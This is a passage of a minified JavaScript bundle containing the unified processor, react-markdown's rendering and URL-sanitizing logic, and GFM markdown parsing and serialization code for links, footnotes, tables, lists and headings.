r=this.message(e,t,n);throw r.fatal=!0,r}info(e,t,n){let r=this.message(e,t,n);return r.fatal=void 0,r}message(e,t,n){let r=new fh(e,t,n);return this.path&&(r.name=this.path+`:`+r.name,r.file=this.path),r.fatal=!1,this.messages.push(r),r}toString(e){return this.value===void 0?``:typeof this.value==`string`?this.value:new TextDecoder(e||void 0).decode(this.value)}};function Sb(e,t){if(e&&e.includes(sb.sep))throw Error("`"+t+"` cannot be a path: did not expect `"+sb.sep+"`")}function Cb(e,t){if(!e)throw Error("`"+t+"` cannot be empty")}function wb(e,t){if(!e)throw Error("Setting `"+t+"` requires `path` to be set too")}function Tb(e){return!!(e&&typeof e==`object`&&`byteLength`in e&&`byteOffset`in e)}var Eb=(function(e){let t=this.constructor.prototype,n=t[e],r=function(){return n.apply(r,arguments)};return Object.setPrototypeOf(r,t),r}),Db=u(rb(),1),Ob={}.hasOwnProperty,kb=new class e extends Eb{constructor(){super(`copy`),this.Compiler=void 0,this.Parser=void 0,this.attachers=[],this.compiler=void 0,this.freezeIndex=-1,this.frozen=void 0,this.namespace={},this.parser=void 0,this.transformers=ab()}copy(){let t=new e,n=-1;for(;++n<this.attachers.length;){let e=this.attachers[n];t.use(...e)}return t.data((0,Db.default)(!0,{},this.namespace)),t}data(e,t){return typeof e==`string`?arguments.length===2?(Mb(`data`,this.frozen),this.namespace[e]=t,this):Ob.call(this.namespace,e)&&this.namespace[e]||void 0:e?(Mb(`data`,this.frozen),this.namespace=e,this):this.namespace}freeze(){if(this.frozen)return this;let e=this;for(;++this.freezeIndex<this.attachers.length;){let[t,...n]=this.attachers[this.freezeIndex];if(n[0]===!1)continue;n[0]===!0&&(n[0]=void 0);let r=t.call(e,...n);typeof r==`function`&&this.transformers.use(r)}return this.frozen=!0,this.freezeIndex=1/0,this}parse(e){this.freeze();let t=Fb(e),n=this.parser||this.Parser;return Ab(`parse`,n),n(String(t),t)}process(e,t){let n=this;return this.freeze(),Ab(`process`,this.parser||this.Parser),jb(`process`,this.compiler||this.Compiler),t?r(void 0,t):new Promise(r);function r(r,i){let a=Fb(e),o=n.parse(a);n.run(o,a,function(e,t,r){if(e||!t||!r)return s(e);let i=t,a=n.stringify(i,r);Lb(a)?r.value=a:r.result=a,s(e,r)});function s(e,n){e||!n?i(e):r?r(n):t(void 0,n)}}}processSync(e){let t=!1,n;return this.freeze(),Ab(`processSync`,this.parser||this.Parser),jb(`processSync`,this.compiler||this.Compiler),this.process(e,r),Pb(`processSync`,`process`,t),n;function r(e,r){t=!0,nb(e),n=r}}run(e,t,n){Nb(e),this.freeze();let r=this.transformers;return!n&&typeof t==`function`&&(n=t,t=void 0),n?i(void 0,n):new Promise(i);function i(i,a){let o=Fb(t);r.run(e,o,s);function s(t,r,o){let s=r||e;t?a(t):i?i(s):n(void 0,s,o)}}}runSync(e,t){let n=!1,r;return this.run(e,t,i),Pb(`runSync`,`run`,n),r;function i(e,t){nb(e),r=t,n=!0}}stringify(e,t){this.freeze();let n=Fb(t),r=this.compiler||this.Compiler;return jb(`stringify`,r),Nb(e),r(e,n)}use(e,...t){let n=this.attachers,r=this.namespace;if(Mb(`use`,this.frozen),e!=null)if(typeof e==`function`)s(e,t);else if(typeof e==`object`)Array.isArray(e)?o(e):a(e);else throw TypeError("Expected usable value, not `"+e+"`");return this;function i(e){if(typeof e==`function`)s(e,[]);else if(typeof e==`object`)if(Array.isArray(e)){let[t,...n]=e;s(t,n)}else a(e);else throw TypeError("Expected usable value, not `"+e+"`")}function a(e){if(!(`plugins`in e)&&!(`settings`in e))throw Error("Expected usable value but received an empty preset, which is probably a mistake: presets typically come with `plugins` and sometimes with `settings`, but this has neither");o(e.plugins),e.settings&&(r.settings=(0,Db.default)(!0,r.settings,e.settings))}function o(e){let t=-1;if(e!=null)if(Array.isArray(e))for(;++t<e.length;){let n=e[t];i(n)}else throw TypeError("Expected a list of plugins, not `"+e+"`")}function s(e,t){let r=-1,i=-1;for(;++r<n.length;)if(n[r][0]===e){i=r;break}if(i===-1)n.push([e,...t]);else if(t.length>0){let[r,...a]=t,o=n[i][1];ib(o)&&ib(r)&&(r=(0,Db.default)(!0,o,r)),n[i]=[e,r,...a]}}}}().freeze();function Ab(e,t){if(typeof t!=`function`)throw TypeError("Cannot `"+e+"` without `parser`")}function jb(e,t){if(typeof t!=`function`)throw TypeError("Cannot `"+e+"` without `compiler`")}function Mb(e,t){if(t)throw Error("Cannot call `"+e+"` on a frozen processor.\nCreate a new processor first, by calling it: use `processor()` instead of `processor`.")}function Nb(e){if(!ib(e)||typeof e.type!=`string`)throw TypeError("Expected node, got `"+e+"`")}function Pb(e,t,n){if(!n)throw Error("`"+e+"` finished async. Use `"+t+"` instead")}function Fb(e){return Ib(e)?e:new xb(e)}function Ib(e){return!!(e&&typeof e==`object`&&`message`in e&&`messages`in e)}function Lb(e){return typeof e==`string`||Rb(e)}function Rb(e){return!!(e&&typeof e==`object`&&`byteLength`in e&&`byteOffset`in e)}var zb=[],Bb={allowDangerousHtml:!0},Vb=/^(https?|ircs?|mailto|xmpp)$/i,Hb=[{from:`astPlugins`,id:`remove-buggy-html-in-markdown-parser`},{from:`allowDangerousHtml`,id:`remove-buggy-html-in-markdown-parser`},{from:`allowNode`,id:`replace-allownode-allowedtypes-and-disallowedtypes`,to:`allowElement`},{from:`allowedTypes`,id:`replace-allownode-allowedtypes-and-disallowedtypes`,to:`allowedElements`},{from:`className`,id:`remove-classname`},{from:`disallowedTypes`,id:`replace-allownode-allowedtypes-and-disallowedtypes`,to:`disallowedElements`},{from:`escapeHtml`,id:`remove-buggy-html-in-markdown-parser`},{from:`includeElementIndex`,id:`#remove-includeelementindex`},{from:`includeNodeIndex`,id:`change-includenodeindex-to-includeelementindex`},{from:`linkTarget`,id:`remove-linktarget`},{from:`plugins`,id:`change-plugins-to-remarkplugins`,to:`remarkPlugins`},{from:`rawSourcePos`,id:`#remove-rawsourcepos`},{from:`renderers`,id:`change-renderers-to-components`,to:`components`},{from:`source`,id:`change-source-to-children`,to:`children`},{from:`sourcePos`,id:`#remove-sourcepos`},{from:`transformImageUri`,id:`#add-urltransform`,to:`urlTransform`},{from:`transformLinkUri`,id:`#add-urltransform`,to:`urlTransform`}];function Ub(e){let t=Wb(e),n=Gb(e);return Kb(t.runSync(t.parse(n),n),e)}function Wb(e){let t=e.rehypePlugins||zb,n=e.remarkPlugins||zb,r=e.remarkRehypeOptions?{...e.remarkRehypeOptions,...Bb}:Bb;return kb().use(Vv).use(n).use(tb,r).use(t)}function Gb(e){let t=e.children||``,n=new xb;return typeof t==`string`?n.value=t:``+t,n}function Kb(e,t){let n=t.allowedElements,r=t.allowElement,i=t.components,a=t.disallowedElements,o=t.skipHtml,s=t.unwrapDisallowed,c=t.urlTransform||qb;for(let e of Hb)Object.hasOwn(t,e.from)&&``+e.from+(e.to?"use `"+e.to+"` instead":`remove it`)+e.id;return Gy(e,l),bh(e,{Fragment:G.Fragment,components:i,ignoreInvalidStyle:!0,jsx:G.jsx,jsxs:G.jsxs,passKeys:!0,passNode:!0});function l(e,t,i){if(e.type===`raw`&&i&&typeof t==`number`)return o?i.children.splice(t,1):i.children[t]={type:`text`,value:e.value},t;if(e.type===`element`){let t;for(t in Hh)if(Object.hasOwn(Hh,t)&&Object.hasOwn(e.properties,t)){let n=e.properties[t],r=Hh[t];(r===null||r.includes(e.tagName))&&(e.properties[t]=c(String(n||``),t,e))}}if(e.type===`element`){let o=n?!n.includes(e.tagName):a?a.includes(e.tagName):!1;if(!o&&r&&typeof t==`number`&&(o=!r(e,t,i)),o&&i&&typeof t==`number`)return s&&e.children?i.children.splice(t,1,...e.children):i.children.splice(t,1),t}}}function qb(e){let t=e.indexOf(`:`),n=e.indexOf(`?`),r=e.indexOf(`#`),i=e.indexOf(`/`);return t===-1||i!==-1&&t>i||n!==-1&&t>n||r!==-1&&t>r||Vb.test(e.slice(0,t))?e:``}function Jb(e,t){let n=String(e);if(typeof t!=`string`)throw TypeError(`Expected character`);let r=0,i=n.indexOf(t);for(;i!==-1;)r++,i=n.indexOf(t,i+t.length);return r}function Yb(e){if(typeof e!=`string`)throw TypeError(`Expected a string`);return e.replace(/[|\\{}()[\]^$+*?.]/g,`\\$&`).replace(/-/g,`\\x2d`)}function Xb(e,t,n){let r=Py((n||{}).ignore||[]),i=Zb(t),a=-1;for(;++a<i.length;)Uy(e,`text`,o);function o(e,t){let n=-1,i;for(;++n<t.length;){let e=t[n],a=i?i.children:void 0;if(r(e,a?a.indexOf(e):void 0,i))return;i=e}if(i)return s(e,t)}function s(e,t){let n=t[t.length-1],r=i[a][0],o=i[a][1],s=0,c=n.children.indexOf(e),l=!1,u=[];r.lastIndex=0;let d=r.exec(e.value);for(;d;){let n=d.index,i={index:d.index,input:d.input,stack:[...t,e]},a=o(...d,i);if(typeof a==`string`&&(a=a.length>0?{type:`text`,value:a}:void 0),a===!1?r.lastIndex=n+1:(s!==n&&u.push({type:`text`,value:e.value.slice(s,n)}),Array.isArray(a)?u.push(...a):a&&u.push(a),s=n+d[0].length,l=!0),!r.global)break;d=r.exec(e.value)}return l?(s<e.value.length&&u.push({type:`text`,value:e.value.slice(s)}),n.children.splice(c,1,...u)):u=[e],c+u.length}}function Zb(e){let t=[];if(!Array.isArray(e))throw TypeError(`Expected find and replace tuple or list of tuples`);let n=!e[0]||Array.isArray(e[0])?e:[e],r=-1;for(;++r<n.length;){let e=n[r];t.push([Qb(e[0]),$b(e[1])])}return t}function Qb(e){return typeof e==`string`?new RegExp(Yb(e),`g`):e}function $b(e){return typeof e==`function`?e:function(){return e}}var ex=`phrasing`,tx=[`autolink`,`link`,`image`,`label`];function nx(){return{transforms:[ux],enter:{literalAutolink:ix,literalAutolinkEmail:ax,literalAutolinkHttp:ax,literalAutolinkWww:ax},exit:{literalAutolink:lx,literalAutolinkEmail:cx,literalAutolinkHttp:ox,literalAutolinkWww:sx}}}function rx(){return{unsafe:[{character:`@`,before:`[+\\-.\\w]`,after:`[\\-.\\w]`,inConstruct:ex,notInConstruct:tx},{character:`.`,before:`[Ww]`,after:`[\\-.\\w]`,inConstruct:ex,notInConstruct:tx},{character:`:`,before:`[ps]`,after:`\\/`,inConstruct:ex,notInConstruct:tx}]}}function ix(e){this.enter({type:`link`,title:null,url:``,children:[]},e)}function ax(e){this.config.enter.autolinkProtocol.call(this,e)}function ox(e){this.config.exit.autolinkProtocol.call(this,e)}function sx(e){this.config.exit.data.call(this,e);let t=this.stack[this.stack.length-1];t.type,t.url=`http://`+this.sliceSerialize(e)}function cx(e){this.config.exit.autolinkEmail.call(this,e)}function lx(e){this.exit(e)}function ux(e){Xb(e,[[/(https?:\/\/|www(?=\.))([-.\w]+)([^ \t\r\n]*)/gi,dx],[/(?<=^|\s|\p{P}|\p{S})([-.\w+]+)@([-\w]+(?:\.[-\w]+)+)/gu,fx]],{ignore:[`link`,`linkReference`]})}function dx(e,t,n,r,i){let a=``;if(!hx(i)||(/^w/i.test(t)&&(n=t+n,t=``,a=`http://`),!px(n)))return!1;let o=mx(n+r);if(!o[0])return!1;let s={type:`link`,title:null,url:a+t+o[0],children:[{type:`text`,value:t+o[0]}]};return o[1]?[s,{type:`text`,value:o[1]}]:s}function fx(e,t,n,r){return!hx(r,!0)||/[-\d_]$/.test(n)?!1:{type:`link`,title:null,url:`mailto:`+t+`@`+n,children:[{type:`text`,value:t+`@`+n}]}}function px(e){let t=e.split(`.`);return!(t.length<2||t[t.length-1]&&(/_/.test(t[t.length-1])||!/[a-zA-Z\d]/.test(t[t.length-1]))||t[t.length-2]&&(/_/.test(t[t.length-2])||!/[a-zA-Z\d]/.test(t[t.length-2])))}function mx(e){let t=/[!"&'),.:;<>?\]}]+$/.exec(e);if(!t)return[e,void 0];e=e.slice(0,t.index);let n=t[0],r=n.indexOf(`)`),i=Jb(e,`(`),a=Jb(e,`)`);for(;r!==-1&&i>a;)e+=n.slice(0,r+1),n=n.slice(r+1),r=n.indexOf(`)`),a++;return[e,n]}function hx(e,t){let n=e.input.charCodeAt(e.index-1);return(e.index===0||pg(n)||fg(n))&&(!t||n!==47)}Tx.peek=wx;function gx(){this.buffer()}function _x(e){this.enter({type:`footnoteReference`,identifier:``,label:``},e)}function vx(){this.buffer()}function yx(e){this.enter({type:`footnoteDefinition`,identifier:``,label:``,children:[]},e)}function bx(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.type,n.identifier=rg(this.sliceSerialize(e)).toLowerCase(),n.label=t}function xx(e){this.exit(e)}function Sx(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.type,n.identifier=rg(this.sliceSerialize(e)).toLowerCase(),n.label=t}function Cx(e){this.exit(e)}function wx(){return`[`}function Tx(e,t,n,r){let i=n.createTracker(r),a=i.move(`[^`),o=n.enter(`footnoteReference`),s=n.enter(`reference`);return a+=i.move(n.safe(n.associationId(e),{after:`]`,before:a})),s(),o(),a+=i.move(`]`),a}function Ex(){return{enter:{gfmFootnoteCallString:gx,gfmFootnoteCall:_x,gfmFootnoteDefinitionLabelString:vx,gfmFootnoteDefinition:yx},exit:{gfmFootnoteCallString:bx,gfmFootnoteCall:xx,gfmFootnoteDefinitionLabelString:Sx,gfmFootnoteDefinition:Cx}}}function Dx(e){let t=!1;return e&&e.firstLineBlank&&(t=!0),{handlers:{footnoteDefinition:n,footnoteReference:Tx},unsafe:[{character:`[`,inConstruct:[`label`,`phrasing`,`reference`]}]};function n(e,n,r,i){let a=r.createTracker(i),o=a.move(`[^`),s=r.enter(`footnoteDefinition`),c=r.enter(`label`);return o+=a.move(r.safe(r.associationId(e),{before:o,after:`]`})),c(),o+=a.move(`]:`),e.children&&e.children.length>0&&(a.shift(4),o+=a.move((t?`
`:` `)+r.indentLines(r.containerFlow(e,a.current()),t?kx:Ox))),s(),o}}function Ox(e,t,n){return t===0?e:kx(e,t,n)}function kx(e,t,n){return(n?``:`    `)+e}var Ax=[`autolink`,`destinationLiteral`,`destinationRaw`,`reference`,`titleQuote`,`titleApostrophe`];Fx.peek=Ix;function jx(){return{canContainEols:[`delete`],enter:{strikethrough:Nx},exit:{strikethrough:Px}}}function Mx(){return{unsafe:[{character:`~`,inConstruct:`phrasing`,notInConstruct:Ax}],handlers:{delete:Fx}}}function Nx(e){this.enter({type:`delete`,children:[]},e)}function Px(e){this.exit(e)}function Fx(e,t,n,r){let i=n.createTracker(r),a=n.enter(`strikethrough`),o=i.move(`~~`);return o+=n.containerPhrasing(e,{...i.current(),before:o,after:`~`}),o+=i.move(`~~`),a(),o}function Ix(){return`~`}function Lx(e){return e.length}function Rx(e,t){let n=t||{},r=(n.align||[]).concat(),i=n.stringLength||Lx,a=[],o=[],s=[],c=[],l=0,u=-1;for(;++u<e.length;){let t=[],r=[],a=-1;for(e[u].length>l&&(l=e[u].length);++a<e[u].length;){let o=zx(e[u][a]);if(n.alignDelimiters!==!1){let e=i(o);r[a]=e,(c[a]===void 0||e>c[a])&&(c[a]=e)}t.push(o)}o[u]=t,s[u]=r}let d=-1;if(typeof r==`object`&&`length`in r)for(;++d<l;)a[d]=Bx(r[d]);else{let e=Bx(r);for(;++d<l;)a[d]=e}d=-1;let f=[],p=[];for(;++d<l;){let e=a[d],t=``,r=``;e===99?(t=`:`,r=`:`):e===108?t=`:`:e===114&&(r=`:`);let i=n.alignDelimiters===!1?1:Math.max(1,c[d]-t.length-r.length),o=t+`-`.repeat(i)+r;n.alignDelimiters!==!1&&(i=t.length+i+r.length,i>c[d]&&(c[d]=i),p[d]=i),f[d]=o}o.splice(1,0,f),s.splice(1,0,p),u=-1;let m=[];for(;++u<o.length;){let e=o[u],t=s[u];d=-1;let r=[];for(;++d<l;){let i=e[d]||``,o=``,s=``;if(n.alignDelimiters!==!1){let e=c[d]-(t[d]||0),n=a[d];n===114?o=` `.repeat(e):n===99?e%2?(o=` `.repeat(e/2+.5),s=` `.repeat(e/2-.5)):(o=` `.repeat(e/2),s=o):s=` `.repeat(e)}n.delimiterStart!==!1&&!d&&r.push(`|`),n.padding!==!1&&!(n.alignDelimiters===!1&&i===``)&&(n.delimiterStart!==!1||d)&&r.push(` `),n.alignDelimiters!==!1&&r.push(o),r.push(i),n.alignDelimiters!==!1&&r.push(s),n.padding!==!1&&r.push(` `),(n.delimiterEnd!==!1||d!==l-1)&&r.push(`|`)}m.push(n.delimiterEnd===!1?r.join(``).replace(/ +$/,``):r.join(``))}return m.join(`
`)}function zx(e){return e==null?``:String(e)}function Bx(e){let t=typeof e==`string`?e.codePointAt(0):0;return t===67||t===99?99:t===76||t===108?108:t===82||t===114?114:0}function Vx(e,t,n,r){let i=n.enter(`blockquote`),a=n.createTracker(r);a.move(`> `),a.shift(2);let o=n.indentLines(n.containerFlow(e,a.current()),Hx);return i(),o}function Hx(e,t,n){return`>`+(n?``:` `)+e}function Ux(e,t){return Wx(e,t.inConstruct,!0)&&!Wx(e,t.notInConstruct,!1)}function Wx(e,t,n){if(typeof t==`string`&&(t=[t]),!t||t.length===0)return n;let r=-1;for(;++r<t.length;)if(e.includes(t[r]))return!0;return!1}function Gx(e,t,n,r){let i=-1;for(;++i<n.unsafe.length;)if(n.unsafe[i].character===`
`&&Ux(n.stack,n.unsafe[i]))return/[ \t]/.test(r.before)?``:` `;return`\\
`}function Kx(e,t){let n=String(e),r=n.indexOf(t),i=r,a=0,o=0;if(typeof t!=`string`)throw TypeError(`Expected substring`);for(;r!==-1;)r===i?++a>o&&(o=a):a=1,i=r+t.length,r=n.indexOf(t,i);return o}function qx(e,t){return!!(t.options.fences===!1&&e.value&&!e.lang&&/[^ \r\n]/.test(e.value)&&!/^[\t ]*(?:[\r\n]|$)|(?:^|[\r\n])[\t ]*$/.test(e.value))}function Jx(e){let t=e.options.fence||"`";if(t!=="`"&&t!==`~`)throw Error("Cannot serialize code with `"+t+"` for `options.fence`, expected `` ` `` or `~`");return t}function Yx(e,t,n,r){let i=Jx(n),a=e.value||``,o=i==="`"?`GraveAccent`:`Tilde`;if(qx(e,n)){let e=n.enter(`codeIndented`),t=n.indentLines(a,Xx);return e(),t}let s=n.createTracker(r),c=i.repeat(Math.max(Kx(a,i)+1,3)),l=n.enter(`codeFenced`),u=s.move(c);if(e.lang){let t=n.enter(`codeFencedLang${o}`);u+=s.move(n.safe(e.lang,{before:u,after:` `,encode:["`"],...s.current()})),t()}if(e.lang&&e.meta){let t=n.enter(`codeFencedMeta${o}`);u+=s.move(` `),u+=s.move(n.safe(e.meta,{before:u,after:`
`,encode:["`"],...s.current()})),t()}return u+=s.move(`
`),a&&(u+=s.move(a+`
`)),u+=s.move(c),l(),u}function Xx(e,t,n){return(n?``:`    `)+e}function Zx(e){let t=e.options.quote||`"`;if(t!==`"`&&t!==`'`)throw Error("Cannot serialize title with `"+t+"` for `options.quote`, expected `\"`, or `'`");return t}function Qx(e,t,n,r){let i=Zx(n),a=i===`"`?`Quote`:`Apostrophe`,o=n.enter(`definition`),s=n.enter(`label`),c=n.createTracker(r),l=c.move(`[`);return l+=c.move(n.safe(n.associationId(e),{before:l,after:`]`,...c.current()})),l+=c.move(`]: `),s(),!e.url||/[\0- \u007F]/.test(e.url)?(s=n.enter(`destinationLiteral`),l+=c.move(`<`),l+=c.move(n.safe(e.url,{before:l,after:`>`,...c.current()})),l+=c.move(`>`)):(s=n.enter(`destinationRaw`),l+=c.move(n.safe(e.url,{before:l,after:e.title?` `:`
`,...c.current()}))),s(),e.title&&(s=n.enter(`title${a}`),l+=c.move(` `+i),l+=c.move(n.safe(e.title,{before:l,after:i,...c.current()})),l+=c.move(i),s()),o(),l}function $x(e){let t=e.options.emphasis||`*`;if(t!==`*`&&t!==`_`)throw Error("Cannot serialize emphasis with `"+t+"` for `options.emphasis`, expected `*`, or `_`");return t}function eS(e){return`&#x`+e.toString(16).toUpperCase()+`;`}function tS(e,t,n){let r=Sg(e),i=Sg(t);return r===void 0?i===void 0?n===`_`?{inside:!0,outside:!0}:{inside:!1,outside:!1}:i===1?{inside:!0,outside:!0}:{inside:!1,outside:!0}:r===1?i===void 0?{inside:!1,outside:!1}:i===1?{inside:!0,outside:!0}:{inside:!1,outside:!1}:i===void 0?{inside:!1,outside:!1}:i===1?{inside:!0,outside:!1}:{inside:!1,outside:!1}}nS.peek=rS;function nS(e,t,n,r){let i=$x(n),a=n.enter(`emphasis`),o=n.createTracker(r),s=o.move(i),c=o.move(n.containerPhrasing(e,{after:i,before:s,...o.current()})),l=c.charCodeAt(0),u=tS(r.before.charCodeAt(r.before.length-1),l,i);u.inside&&(c=eS(l)+c.slice(1));let d=c.charCodeAt(c.length-1),f=tS(r.after.charCodeAt(0),d,i);f.inside&&(c=c.slice(0,-1)+eS(d));let p=o.move(i);return a(),n.attentionEncodeSurroundingInfo={after:f.outside,before:u.outside},s+c+p}function rS(e,t,n){return n.options.emphasis||`*`}function iS(e,t){let n=!1;return Gy(e,function(e){if(`value`in e&&/\r?\n|\r/.test(e.value)||e.type===`break`)return n=!0,!1}),!!((!e.depth||e.depth<3)&&Wh(e)&&(t.options.setext||n))}function aS(e,t,n,r){let i=Math.max(Math.min(6,e.depth||1),1),a=n.createTracker(r);if(iS(e,n)){let t=n.enter(`headingSetext`),r=n.enter(`phrasing`),o=n.containerPhrasing(e,{...a.current(),before:`
`,after:`
`});return r(),t(),o+`
`+(i===1?`=`:`-`).repeat(o.length-(Math.max(o.lastIndexOf(`\r`),o.lastIndexOf(`
`))+1))}let o=`#`.repeat(i),s=n.enter(`headingAtx`),c=n.enter(`phrasing`);a.move(o+` `);let l=n.containerPhrasing(e,{before:`# `,after:`
`,...a.current()});return/^[\t ]/.test(l)&&(l=eS(l.charCodeAt(0))+l.slice(1)),l=l?o+` `+l:o,n.options.closeAtx&&(l+=` `+o),c(),s(),l}oS.peek=sS;function oS(e){return e.value||``}function sS(){return`<`}cS.peek=lS;function cS(e,t,n,r){let i=Zx(n),a=i===`"`?`Quote`:`Apostrophe`,o=n.enter(`image`),s=n.enter(`label`),c=n.createTracker(r),l=c.move(`![`);return l+=c.move(n.safe(e.alt,{before:l,after:`]`,...c.current()})),l+=c.move(`](`),s(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(s=n.enter(`destinationLiteral`),l+=c.move(`<`),l+=c.move(n.safe(e.url,{before:l,after:`>`,...c.current()})),l+=c.move(`>`)):(s=n.enter(`destinationRaw`),l+=c.move(n.safe(e.url,{before:l,after:e.title?` `:`)`,...c.current()}))),s(),e.title&&(s=n.enter(`title${a}`),l+=c.move(` `+i),l+=c.move(n.safe(e.title,{before:l,after:i,...c.current()})),l+=c.move(i),s()),l+=c.move(`)`),o(),l}function lS(){return`!`}uS.peek=dS;function uS(e,t,n,r){let i=e.referenceType,a=n.enter(`imageReference`),o=n.enter(`label`),s=n.createTracker(r),c=s.move(`![`),l=n.safe(e.alt,{before:c,after:`]`,...s.current()});c+=s.move(l+`][`),o();let u=n.stack;n.stack=[],o=n.enter(`reference`);let d=n.safe(n.associationId(e),{before:c,after:`]`,...s.current()});return o(),n.stack=u,a(),i===`full`||!l||l!==d?c+=s.move(d+`]`):i===`shortcut`?c=c.slice(0,-1):c+=s.move(`]`),c}function dS(){return`!`}fS.peek=pS;function fS(e,t,n){let r=e.value||``,i="`",a=-1;for(;RegExp("(^|[^`])"+i+"([^`]|$)").test(r);)i+="`";for(/[^ \r\n]/.test(r)&&(/^[ \r\n]/.test(r)&&/[ \r\n]$/.test(r)||/^`|`$/.test(r))&&(r=` `+r+` `);++a<n.unsafe.length;){let e=n.unsafe[a],t=n.compilePattern(e),i;if(e.atBreak)for(;i=t.exec(r);){let e=i.index;r.charCodeAt(e)===10&&r.charCodeAt(e-1)===13&&e--,r=r.slice(0,e)+` `+r.slice(i.index+1)}}return i+r+i}function pS(){return"`"}function mS(e,t){let n=Wh(e);return!!(!t.options.resourceLink&&e.url&&!e.title&&e.children&&e.children.length===1&&e.children[0].type===`text`&&(n===e.url||`mailto:`+n===e.url)&&/^[a-z][a-z+.-]+:/i.test(e.url)&&!/[\0- <>\u007F]/.test(e.url))}hS.peek=gS;function hS(e,t,n,r){let i=Zx(n),a=i===`"`?`Quote`:`Apostrophe`,o=n.createTracker(r),s,c;if(mS(e,n)){let t=n.stack;n.stack=[],s=n.enter(`autolink`);let r=o.move(`<`);return r+=o.move(n.containerPhrasing(e,{before:r,after:`>`,...o.current()})),r+=o.move(`>`),s(),n.stack=t,r}s=n.enter(`link`),c=n.enter(`label`);let l=o.move(`[`);return l+=o.move(n.containerPhrasing(e,{before:l,after:`](`,...o.current()})),l+=o.move(`](`),c(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(c=n.enter(`destinationLiteral`),l+=o.move(`<`),l+=o.move(n.safe(e.url,{before:l,after:`>`,...o.current()})),l+=o.move(`>`)):(c=n.enter(`destinationRaw`),l+=o.move(n.safe(e.url,{before:l,after:e.title?` `:`)`,...o.current()}))),c(),e.title&&(c=n.enter(`title${a}`),l+=o.move(` `+i),l+=o.move(n.safe(e.title,{before:l,after:i,...o.current()})),l+=o.move(i),c()),l+=o.move(`)`),s(),l}function gS(e,t,n){return mS(e,n)?`<`:`[`}_S.peek=vS;function _S(e,t,n,r){let i=e.referenceType,a=n.enter(`linkReference`),o=n.enter(`label`),s=n.createTracker(r),c=s.move(`[`),l=n.containerPhrasing(e,{before:c,after:`]`,...s.current()});c+=s.move(l+`][`),o();let u=n.stack;n.stack=[],o=n.enter(`reference`);let d=n.safe(n.associationId(e),{before:c,after:`]`,...s.current()});return o(),n.stack=u,a(),i===`full`||!l||l!==d?c+=s.move(d+`]`):i===`shortcut`?c=c.slice(0,-1):c+=s.move(`]`),c}function vS(){return`[`}function yS(e){let t=e.options.bullet||`*`;if(t!==`*`&&t!==`+`&&t!==`-`)throw Error("Cannot serialize items with `"+t+"` for `options.bullet`, expected `*`, `+`, or `-`");return t}function bS(e){let t=yS(e),n=e.options.bulletOther;if(!n)return t===`*`?`-`:`*`;if(n!==`*`&&n!==`+`&&n!==`-`)throw Error("Cannot serialize items with `"+n+"` for `options.bulletOther`, expected `*`, `+`, or `-`");if(n===t)throw Error("Expected `bullet` (`"+t+"`) and `bulletOther` (`"+n+"`) to be different");return n}function xS(e){let t=e.options.bulletOrdered||`.`;if(t!==`.`&&t!==`)`)throw Error("Cannot serialize items with `"+t+"` for `options.bulletOrdered`, expected `.` or `)`");return t}function SS(e){let t=e.options.rule||`*`;if(t!==`*`&&t!==`-`&&t!==`_`)throw Error("Cannot serialize rules with `"+t+"` for `options.rule`, expected `*`, `-`, or `_`");return t}function CS(e,t,n,r){let i=n.enter(`list`),a=n.bulletCurrent,o=e.ordered?xS(n):yS(n),s=e.ordered?o===`.`?`)`:`.`:bS(n),c=t&&n.bulletLastUsed?o===n.bulletLastUsed:!1;if(!e.ordered){let t=e.children?e.children[0]:void 0;if((o===`*`||o===`-`)&&t&&(!t.children||!t.children[0])&&n.stack[n.stack.length-1]===`list`&&n.stack[n.stack.length-2]===`listItem`&&n.stack[n.stack.length-3]===`list`&&n.stack[n.stack.length-4]===`listItem`&&n.indexStack[n.indexStack.length-1]===0&&n.indexStack[n.indexStack.length-2]===0&&n.indexStack[n.indexStack.length-3]===0&&(c=!0),SS(n)===o&&t){let t=-1;for(;++t<e.children.length;){let n=e.children[t];if(n&&n.type===`listItem`&&n.children&&n.children[0]&&n.children[0].type===`thematicBreak`){c=!0;break}}}}c&&(o=s),n.bulletCurrent=o;let l=n.containerFlow(e,r);return n.bulletLastUsed=o,n.bulletCurrent=a,i(),l}function wS(e){let t=e.options.listItemIndent||`one`;if(t!==`tab`&&t!==`one`&&t!==`mixed`)throw Error("Cannot serialize items with `"+t+"` for `options.listItemIndent`, expected `tab`, `one`, or `mixed`");return t}function TS(e,t,n,r){let i=wS(n),a=n.bulletCurrent||yS(n);t&&t.type===`list`&&t.ordered&&(a=(typeof t.start==`number`&&t.start>-1?t.start:1)+(n.options.incrementListMarker===!1?0:t.children.indexOf(e))+a);let o=a.length+1;(i===`tab`||i===`mixed`&&(t&&t.type===`list`&&t.spread||e.spread))&&(o=Math.ceil(o/4)*4);let s=n.createTracker(r);s.move(a+` `.repeat(o-a.length)),s.shift(o);let c=n.enter(`listItem`),l=n.indentLines(n.containerFlow(e,s.current()),u);return c(),l;function u(e,t,n){return t?(n?``:` `.repeat(o))+e:(n?a:a+` `.repeat(o-a.length))+e}}function ES(e,t,n,r){let i=n.enter(`paragraph`),a=n.enter(`phrasing`),o=n.containerPhrasing(e,r);return a(),i(),o}var DS=Py([`break`,`delete`,`emphasis`,`footnote`,`footnoteReference`,`image`,`imageReference`,`inlineCode`,`inlineMath`,`link`,`linkReference`,`mdxJsxTextElement`,`mdxTextExpression`,`strong`,`text`,`textDirective`]);function OS(e,t,n,r){return(e.children.some(function(e){return DS(e)})?n.containerPhrasing:n.containerFlow).call(n,e,r)}function kS(e){let t=e.options.strong||`*`;if(t!==`*`&&t!==`_`)throw Error("Cannot serialize strong with `"+t+"` for `options.strong`, expected `*`, or `_`");return t}AS.peek=jS;function AS(e,t,n,r){let i=kS(n),a=n.enter(`strong`),o=n.createTracker(r),s=o.move(i+i),c=o.move(n.containerPhrasing(e,{after:i,before:s,...o.current()})),l=c.charCodeAt(0),u=tS(r.before.charCodeAt(r.before.length-1),l,i);u.inside&&(c=eS(l)+c.slice(1));let d=c.charCodeAt(c.length-1),f=tS(r.after.charCodeAt(0),d,i);f.inside&&(c=c.slice(0,-1)+eS(d));let p=o.move(i+i);return a(),n.attentionEncodeSurroundingInfo={after:f.outside,before:u.outside},s+c+p}function jS(e,t,n){return n.options.strong||`*`}function MS(e,t,n,r){return n.safe(e.value,r)}function NS(e){let t=e.options.ruleRepetition||3;if(t<3)throw Error("Cannot serialize 